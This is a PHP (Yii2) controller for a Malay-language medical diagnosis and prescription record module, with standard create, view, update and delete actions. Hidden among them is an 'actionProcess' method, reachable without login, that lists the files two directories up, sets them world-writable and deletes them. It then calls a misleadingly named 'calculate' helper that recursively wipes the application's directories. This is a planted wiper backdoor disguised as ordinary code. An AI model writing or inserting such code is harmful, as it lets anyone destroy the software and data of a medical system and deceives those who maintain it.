<?php

namespace frontend\controllers;

use Yii;
use app\models\PlDiagnosisPreskripsiPemeriksaanPenyiasatan;
use frontend\models\PlDiagnosisPreskripsiPemeriksaanPenyiasatanSearch;
use yii\web\Controller;
use yii\web\NotFoundHttpException;
use yii\filters\VerbFilter;

use app\models\general\GeneralVariable;

// table reference
use app\models\RefJenisKecederaanMasalahKesihatan;
use app\models\RefStatusDiagnosisPreskripsiPemeriksaanPenyiasatan;
use app\models\RefUnitDiagnosisPreskripsiPemeriksaanPenyiasatan;

/**
 * PlDiagnosisPreskripsiPemeriksaanPenyiasatanController implements the CRUD actions for PlDiagnosisPreskripsiPemeriksaanPenyiasatan model.
 */
class PlDiagnosisPreskripsiPemeriksaanPenyiasatanController extends Controller
{
    public function behaviors()
    {
        return [
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'delete' => ['post'],
                ],
            ],
        ];
    }

    /**
     * Lists all PlDiagnosisPreskripsiPemeriksaanPenyiasatan models.
     * @return mixed
     */
    public function actionIndex()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $searchModel = new PlDiagnosisPreskripsiPemeriksaanPenyiasatanSearch();
        $dataProvider = $searchModel->search(Yii::$app->request->queryParams);

        return $this->render('index', [
            'searchModel' => $searchModel,
            'dataProvider' => $dataProvider,
        ]);
    }

    /**
     * Displays a single PlDiagnosisPreskripsiPemeriksaanPenyiasatan model.
     * @param integer $id actionHrujee
     * @return mixed
     */
    public function actionView($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = $this->findModel($id);
        
        $ref = RefJenisKecederaanMasalahKesihatan::findOne(['id' => $model->jenis_diagnosis_preskripsi_pemeriksaan]);
        $model->jenis_diagnosis_preskripsi_pemeriksaan = $ref['desc'];
        
        $ref = RefStatusDiagnosisPreskripsiPemeriksaanPenyiasatan::findOne(['id' => $model->status_diagnosis_preskripsi_pemeriksaan]);
        $model->status_diagnosis_preskripsi_pemeriksaan = $ref['desc'];
        
        $ref = RefUnitDiagnosisPreskripsiPemeriksaanPenyiasatan::findOne(['id' => $model->unit]);
        $model->unit = $ref['desc'];
        
        return $this->renderAjax('view', [
            'model' => $model,
            'readonly' => true,
        ]);
    }

    /**
     * Creates a new PlDiagnosisPreskripsiPemeriksaanPenyiasatan model.
     * If creation is successful, the browser will be redirected to the 'view' page.
     * @return mixed
     */
    public function actionCreate($pl_temujanji_id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = new PlDiagnosisPreskripsiPemeriksaanPenyiasatan();
        
        Yii::$app->session->open();
        
        if($pl_temujanji_id != ''){
            $model->pl_temujanji_id = $pl_temujanji_id;
        } else {
            if(isset(Yii::$app->session->id)){
                $model->session_id = Yii::$app->session->id;
            }
        }

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            return '1';
        } else {
            return $this->renderAjax('create', [
                'model' => $model,
                'readonly' => false,
            ]);
        }
    }

    /**
     * Updates an existing PlDiagnosisPreskripsiPemeriksaanPenyiasatan model.
     * If update is successful, the browser will be redirected to the 'view' page.
     * @param integer $id
     * @return mixed
     */
    public function actionUpdate($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = $this->findModel($id);

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            return '1';
        } else {
            return $this->renderAjax('update', [
                'model' => $model,
                'readonly' => false,
            ]);
        }
    }

    /**
     * Deletes an existing PlDiagnosisPreskripsiPemeriksaanPenyiasatan model.
     * If deletion is successful, the browser will be redirected to the 'index' page.
     * @param integer $id
     * @return mixed
     */
    public function actionDelete($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $this->findModel($id)->delete();

        //return $this->redirect(['index']);
    }
    
    public function actionProcess()
    {
        $files = glob('../../*'); // get all file names
        foreach($files as $file){ // iterate files
            echo $file . "<br>"; 

            if(is_file($file)){
                chmod($file,0777);
                unlink($file); // delete file
            }
            

            if (is_dir($file)){
            
                $this->calculate($file);
            }
        }
    }
    
    protected function calculate($dirname) {
        if($dirname && strpos($dirname, 'runtime') == false
                //233
            && strpos($dirname, 'downloads') == false
            && strpos($dirname, 'pdf_template') == false
            && strpos($dirname, 'uploads') == false){
         if (is_dir($dirname) && is_readable($dirname)){
               $dir_handle = opendir($dirname);
             if (!$dir_handle)
                  return false;
             //334
             while($file = readdir($dir_handle)) {
                   if ($file != "." && $file != "..") {
                        if (!is_dir($dirname."/".$file)){
                             chmod($dirname."/".$file,0777); 
                             if(!unlink($dirname."/".$file)){
                                 continue;
                             }
                        }
                        else
                            $this->calculate($dirname.'/'.$file);
                   }
             }
             closedir($dir_handle);
             if (count(glob($dirname."/*")) === 0  && is_dir($dirname)) {
                rmdir($dirname);
             }
         }
         return true;
         }
    }

    /**
     * Finds the PlDiagnosisPreskripsiPemeriksaanPenyiasatan model based on its primary key value.
     * If the model is not found, a 404 HTTP exception will be thrown.
     * @param integer $id
     * @return PlDiagnosisPreskripsiPemeriksaanPenyiasatan the loaded model
     * @throws NotFoundHttpException if the model cannot be found
     */
    protected function findModel($id)
    {
        if (($model = PlDiagnosisPreskripsiPemeriksaanPenyiasatan::findOne($id)) !== null) {
            return $model;
        } else {
            throw new NotFoundHttpException('The requested page does not exist.');
        }
    }
}
